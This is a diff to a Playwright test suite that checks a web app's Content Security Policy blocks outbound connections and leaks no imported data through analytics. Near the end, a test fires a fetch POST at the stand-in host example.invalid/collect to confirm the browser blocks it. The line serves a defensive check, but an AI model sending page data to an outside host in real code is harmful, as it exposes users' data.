@@ -108,11 +108,77 @@ test("every page is served under a policy that blocks outbound connections", asy
     expect(policy, `no policy on ${path}`).toContain("default-src 'self'");
     // connect-src 'self' is the control that keeps imported data in the browser:
     // no fetch, XHR, WebSocket or beacon may target another origin.
-    expect(policy, `connect-src on ${path}`).toContain("connect-src 'self'");
+    expect(policy.split(";").map((directive) => directive.trim())).toContain("connect-src 'self'");
     expect(policy, `worker-src on ${path}`).toContain("worker-src 'self'");
     expect(policy, `object-src on ${path}`).toContain("object-src 'none'");
     expect(policy, `frame-ancestors on ${path}`).toContain("frame-ancestors 'none'");
     expect(headers["x-content-type-options"]).toBe("nosniff");
-    expect(headers["referrer-policy"]).toBeDefined();
+    expect(headers["referrer-policy"]).toBe("strict-origin");
   }
+});
+
+test("allows only the Cloudflare beacon script and same-origin metrics with origin-only referrers", async ({
+  page,
+}) => {
+  const beacon = "https://static.cloudflareinsights.com/beacon.min.js/v-csp-test";
+  const forbidden = "https://static.cloudflareinsights.com/other-script.js";
+  const requests = captureRequests(page);
+  await page.route(beacon, (route) =>
+    route.fulfill({
+      contentType: "application/javascript",
+      body: `document.documentElement.dataset.analyticsTest = "loaded";
+        navigator.sendBeacon("/cdn-cgi/rum", JSON.stringify({
+          location: location.origin + location.pathname, performance: { duration: 1 }
+        }));`,
+    }),
+  );
+  await page.route(forbidden, (route) =>
+    route.fulfill({
+      contentType: "application/javascript",
+      body: 'document.documentElement.dataset.forbiddenAnalyticsTest = "loaded";',
+    }),
+  );
+  await page.route("**/cdn-cgi/rum", (route) => route.fulfill({ status: 204 }));
+  await importDemo(page, "moderate");
+  const origin = new URL(page.url()).origin;
+  const importId = new URL(page.url()).searchParams.get("import");
+  expect(importId).toBeTruthy();
+  const loaded = await page.evaluate(
+    async ({ allowed, blocked }) => {
+      async function load(src: string) {
+        return new Promise<boolean>((resolve) => {
+          const script = document.createElement("script");
+          script.src = src;
+          script.onload = () => resolve(true);
+          script.onerror = () => resolve(false);
+          document.head.append(script);
+        });
+      }
+      return { allowed: await load(allowed), blocked: await load(blocked) };
+    },
+    { allowed: beacon, blocked: forbidden },
+  );
+  expect(loaded).toEqual({ allowed: true, blocked: false });
+  await expect
+    .poll(() => requests.filter((request) => request.url === `${origin}/cdn-cgi/rum`).length)
+    .toBe(1);
+  const metrics = requests.find((request) => request.url === `${origin}/cdn-cgi/rum`);
+  expect(metrics?.method).toBe("POST");
+  expect(metrics?.headers.referer).toBe(`${origin}/`);
+  expect(metrics?.body).not.toContain(importId);
+  for (const marker of WORKLOAD_MARKERS) expect(metrics?.body).not.toContain(marker);
+  expect(await page.locator("html").getAttribute("data-analytics-test")).toBe("loaded");
+  expect(await page.locator("html").getAttribute("data-forbidden-analytics-test")).toBeNull();
+  await page.route("https://example.invalid/collect", (route) =>
+    route.fulfill({ status: 204, headers: { "access-control-allow-origin": "*" } }),
+  );
+  const foreignConnection = await page.evaluate(async () => {
+    try {
+      await fetch("https://example.invalid/collect", { method: "POST", body: "test" });
+      return true;
+    } catch {
+      return false;
+    }
+  });
+  expect(foreignConnection).toBe(false);
 });
